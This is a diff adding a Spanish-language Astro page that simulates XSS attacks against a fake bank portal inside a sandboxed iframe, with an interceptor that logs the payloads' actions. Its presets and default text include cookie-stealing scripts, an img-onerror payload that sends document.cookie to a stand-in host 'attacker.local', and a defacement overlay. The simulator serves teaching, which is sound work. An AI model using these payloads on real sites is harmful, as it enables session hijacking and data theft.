@@ -1,0 +1,298 @@
+---
+import Layout from '../../layouts/Layout.astro';
+---
+
+<Layout title="Sandbox Aislado | Simulador de Vulnerabilidades XSS">
+  <div class="space-y-8">
+    
+    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-cyber-border/80 pb-5">
+      <div>
+        <h1 class="text-2xl sm:text-3xl font-bold font-mono text-white flex items-center gap-3">
+          <span class="p-2 rounded-lg bg-cyber-glow/10 border border-cyber-glow/30 text-cyber-glow">
+            <svg class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
+          </span>
+          Sandbox Seguro & Servidor de Exfiltración
+        </h1>
+        <p class="text-xs sm:text-sm text-slate-400 mt-1 font-mono">
+          Ejecuta y analiza payloads en un entorno controlado con emulación de víctima, cookies de sesión e interceptor en tiempo real.
+        </p>
+      </div>
+
+      <div class="flex items-center gap-2">
+        <button id="reset-sandbox-btn" class="px-3 py-1.5 rounded-lg bg-cyber-panel hover:bg-cyber-card border border-cyber-border text-slate-300 hover:text-white text-xs font-mono transition-all">
+          Reiniciar Sandbox
+        </button>
+      </div>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+      
+      <div class="lg:col-span-6 space-y-4">
+        
+        <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 space-y-4">
+          <div class="flex items-center justify-between">
+            <div class="flex items-center gap-2">
+              <span class="w-2.5 h-2.5 rounded-full bg-cyber-accent"></span>
+              <span class="text-xs font-mono font-bold text-white uppercase">Editor de Carga Maliciosa</span>
+            </div>
+            <span class="text-[10px] font-mono text-slate-400">Sandbox Iframe Aislado</span>
+          </div>
+
+          <div>
+            <textarea
+              id="sandbox-payload-input"
+              rows="6"
+              class="w-full p-3 rounded-lg bg-cyber-bg border border-cyber-border font-mono text-xs text-cyber-accent focus:border-cyber-accent focus:outline-none resize-none leading-relaxed"
+              placeholder="Escribe aquí tu payload..."
+            >&lt;script&gt;
+  const cookie = document.cookie;
+  console.log("Cookie robada:", cookie);
+  alert("XSS Exitoso! Cookie: " + cookie);
+&lt;/script&gt;</textarea>
+          </div>
+
+          <div class="flex flex-wrap items-center justify-between gap-2 pt-1">
+            <div class="flex flex-wrap gap-1.5">
+              <button class="sandbox-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="<script>alert('Cookie: ' + document.cookie)</script>">Robo Cookie</button>
+              <button class="sandbox-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="<img src=x onerror=&quot;fetch('http://attacker.local/log?c=' + encodeURIComponent(document.cookie))&quot;>">Exfiltrar HTTP</button>
+              <button class="sandbox-preset px-2 py-1 rounded bg-cyber-panel text-slate-300 hover:text-white text-[11px] font-mono border border-cyber-border/60" data-code="<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;display:flex;align-items:center;justify-content:center;font-size:24px;'>HACKEADO (Defacement)</div>">Defacement</button>
+            </div>
+
+            <button
+              id="execute-sandbox-btn"
+              class="px-4 py-2 rounded-lg bg-cyber-accent hover:bg-emerald-400 text-black font-mono font-bold text-xs transition-all shadow-neon-green/20"
+            >
+              Inyectar en Sandbox
+            </button>
+          </div>
+        </div>
+
+        <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 space-y-3">
+          <div class="flex items-center justify-between">
+            <span class="text-xs font-mono font-bold text-white uppercase">Vista Previa del Navegador Víctima</span>
+            <div class="flex items-center gap-2">
+              <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+              <span class="text-[10px] font-mono text-emerald-300">target-app.internal</span>
+            </div>
+          </div>
+
+          <div class="rounded-lg border border-cyber-border/80 overflow-hidden bg-white">
+            <div class="bg-slate-800 px-3 py-1.5 flex items-center justify-between border-b border-slate-700 text-[11px] font-mono text-slate-400">
+              <div class="flex items-center gap-1.5">
+                <span class="w-2.5 h-2.5 rounded-full bg-red-500 inline-block"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-amber-500 inline-block"></span>
+                <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 inline-block"></span>
+                <span class="ml-2 text-slate-300 font-sans">https://portal.bank-secure.local/dashboard</span>
+              </div>
+            </div>
+            
+            <iframe
+              id="sandbox-iframe"
+              class="w-full h-64 border-0"
+              sandbox="allow-scripts allow-modals"
+              srcdoc="<!DOCTYPE html><html><head><meta charset='UTF-8'><style>body{font-family:sans-serif;padding:15px;background:#f8fafc;color:#0f172a;margin:0;}h2{margin-top:0;font-size:16px;color:#1e293b;}input,button{padding:6px 10px;border-radius:4px;border:1px solid #cbd5e1;font-size:12px;}.card{background:white;padding:12px;border-radius:6px;border:1px solid #e2e8f0;margin-bottom:10px;}</style></head><body><div class='card'><h2>Portal Bancario - Sesión de Administrador</h2><p style='font-size:12px;color:#64748b;'>Bienvenido, <strong>Admin</strong>. Saldo corporativo: $1,450,000 USD</p></div><div id='target-container'></div></body></html>"
+            ></iframe>
+          </div>
+        </div>
+
+      </div>
+
+      <div class="lg:col-span-6 space-y-4">
+        
+        <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 space-y-4">
+          <div class="flex items-center justify-between">
+            <div class="flex items-center gap-2">
+              <span class="w-2.5 h-2.5 rounded-full bg-cyber-glow"></span>
+              <span class="text-xs font-mono font-bold text-white uppercase">Datos Sensibles Simulados de la Víctima</span>
+            </div>
+            <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyber-panel text-cyber-glow border border-cyber-glow/30">Contexto Aislado</span>
+          </div>
+
+          <div class="grid grid-cols-1 gap-2.5 font-mono text-xs">
+            <div class="p-2.5 rounded bg-cyber-bg border border-cyber-border/80">
+              <div class="text-[10px] text-slate-500 uppercase">document.cookie:</div>
+              <div class="text-cyber-glow font-bold text-[11px] break-all">session_token=AUTH_SEC_ADMIN_99218274; user=admin_master; role=superadmin</div>
+            </div>
+            <div class="p-2.5 rounded bg-cyber-bg border border-cyber-border/80">
+              <div class="text-[10px] text-slate-500 uppercase">window.localStorage:</div>
+              <div class="text-slate-300 text-[11px] break-all">&#123;"api_key": "live_prod_sec_token_99182", "balance": "1450000"&#125;</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="rounded-xl bg-cyber-card border border-cyber-border p-5 space-y-3">
+          <div class="flex items-center justify-between">
+            <div class="flex items-center gap-2">
+              <span class="w-2.5 h-2.5 rounded-full bg-cyber-danger animate-pulse"></span>
+              <span class="text-xs font-mono font-bold text-white uppercase">Interceptor de Eventos & Exfiltración (C2 Listener)</span>
+            </div>
+            <button id="clear-interceptor-btn" class="text-[11px] font-mono text-slate-400 hover:text-red-400">
+              Limpiar Capturas
+            </button>
+          </div>
+
+          <div id="interceptor-console" class="p-3 rounded-lg bg-black/90 border border-cyber-border/90 font-mono text-xs min-h-[220px] max-h-[280px] overflow-y-auto space-y-2 text-slate-300">
+            <div class="text-slate-500 text-[11px] italic">
+              [LISTENER] Escuchando ejecuciones del sandbox...
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+
+  </div>
+</Layout>
+
+<script>
+  import { saveLog } from '../../utils/storage.js';
+  import { analyzePayload } from '../../utils/xssAnalyzer.js';
+
+  function createSandboxContent(payload) {
+    return `<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 15px; background: #f8fafc; color: #0f172a; margin: 0; }
+    h2 { margin-top: 0; font-size: 15px; color: #1e293b; }
+    .card { background: white; padding: 12px; border-radius: 6px; border: 1px solid #e2e8f0; margin-bottom: 10px; font-size: 12px; }
+  </style>
+  <script>
+    document.cookie = "session_token=AUTH_SEC_ADMIN_99218274; user=admin_master; role=superadmin";
+    localStorage.setItem("api_key", "live_prod_sec_token_99182");
+    localStorage.setItem("balance", "1450000");
+
+    const originalAlert = window.alert;
+    window.alert = function(msg) {
+      window.parent.postMessage({ type: 'INTERCEPT_ALERT', content: String(msg) }, '*');
+      originalAlert(msg);
+    };
+
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+      window.parent.postMessage({ type: 'INTERCEPT_FETCH', url: String(args[0]) }, '*');
+      return originalFetch.apply(this, args);
+    };
+
+    const originalOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url) {
+      window.parent.postMessage({ type: 'INTERCEPT_XHR', url: String(url) }, '*');
+      return originalOpen.apply(this, arguments);
+    };
+
+    window.onerror = function(msg) {
+      window.parent.postMessage({ type: 'INTERCEPT_ERROR', message: String(msg) }, '*');
+    };
+  <\/script>
+</head>
+<body>
+  <div class="card">
+    <h2>Portal Bancario - Sesión de Administrador</h2>
+    <p style="color:#64748b;margin:4px 0 0 0;">Usuario: <strong>admin_master</strong> | Balance: $1,450,000 USD</p>
+  </div>
+  <div id="injection-target">
+    ${payload}
+  </div>
+</body>
+</html>`;
+  }
+
+  function logToConsole(type, title, message) {
+    const consoleBox = document.getElementById('interceptor-console');
+    if (!consoleBox) return;
+
+    const time = new Date().toLocaleTimeString();
+    const entry = document.createElement('div');
+    entry.className = 'p-2 rounded border text-[11px] font-mono flex flex-col gap-1 ' + (
+      type === 'alert' ? 'bg-red-950/60 border-red-500/60 text-red-300' :
+      type === 'fetch' ? 'bg-amber-950/60 border-amber-500/60 text-amber-300' :
+      type === 'error' ? 'bg-slate-900 border-slate-700 text-slate-400' :
+      'bg-cyan-950/60 border-cyan-500/60 text-cyan-300'
+    );
+
+    entry.innerHTML = `
+      <div class="flex items-center justify-between text-[10px] opacity-75">
+        <span class="font-bold uppercase">[${type}] ${title}</span>
+        <span>${time}</span>
+      </div>
+      <div class="break-all font-semibold">${message}</div>
+    `;
+
+    consoleBox.appendChild(entry);
+    consoleBox.scrollTop = consoleBox.scrollHeight;
+  }
+
+  function setupSandbox() {
+    const textarea = document.getElementById('sandbox-payload-input');
+    const executeBtn = document.getElementById('execute-sandbox-btn');
+    const iframe = document.getElementById('sandbox-iframe');
+    const resetBtn = document.getElementById('reset-sandbox-btn');
+    const clearBtn = document.getElementById('clear-interceptor-btn');
+
+    document.querySelectorAll('.sandbox-preset').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const code = btn.getAttribute('data-code');
+        if (textarea && code) textarea.value = code;
+      });
+    });
+
+    if (executeBtn && textarea && iframe) {
+      executeBtn.addEventListener('click', () => {
+        const payload = textarea.value;
+        const html = createSandboxContent(payload);
+        iframe.srcdoc = html;
+
+        const analysis = analyzePayload(payload);
+        saveLog({
+          module: 'Sandbox',
+          payload,
+          severity: analysis.severity,
+          result: 'Inyectado en Sandbox Iframe',
+          cvss: analysis.cvssScore
+        });
+
+        logToConsole('info', 'PAYLOAD INYECTADO', 'Ejecutando contenido en iframe aislado...');
+        if (window.showToast) {
+          window.showToast('Payload inyectado en el sandbox seguro', 'success');
+        }
+      });
+    }
+
+    if (resetBtn && textarea && iframe) {
+      resetBtn.addEventListener('click', () => {
+        textarea.value = '<script>\n  alert("Cookie: " + document.cookie);\n<\/script>';
+        iframe.srcdoc = createSandboxContent('');
+        logToConsole('info', 'RESETEADO', 'Entorno del sandbox restablecido a valores iniciales.');
+        if (window.showToast) {
+          window.showToast('Sandbox restablecido', 'info');
+        }
+      });
+    }
+
+    if (clearBtn) {
+      clearBtn.addEventListener('click', () => {
+        const consoleBox = document.getElementById('interceptor-console');
+        if (consoleBox) {
+          consoleBox.innerHTML = '<div class="text-slate-500 text-[11px] italic">[LISTENER] Escuchando ejecuciones del sandbox...</div>';
+        }
+      });
+    }
+
+    window.addEventListener('message', (event) => {
+      if (!event.data || typeof event.data !== 'object') return;
+      const { type, content, url, message } = event.data;
+
+      if (type === 'INTERCEPT_ALERT') {
+        logToConsole('alert', 'ALERTA XSS DISPARADA', `Mensaje interceptado: "${content}"`);
+      } else if (type === 'INTERCEPT_FETCH' || type === 'INTERCEPT_XHR') {
+        logToConsole('fetch', 'SOLICITUD DE EXFILTRACIÓN HTTP', `Destino remoto: ${url}`);
+      } else if (type === 'INTERCEPT_ERROR') {
+        logToConsole('error', 'ERROR DE EJECUCIÓN', message);
+      }
+    });
+  }
+
+  document.addEventListener('DOMContentLoaded', setupSandbox);
+</script>
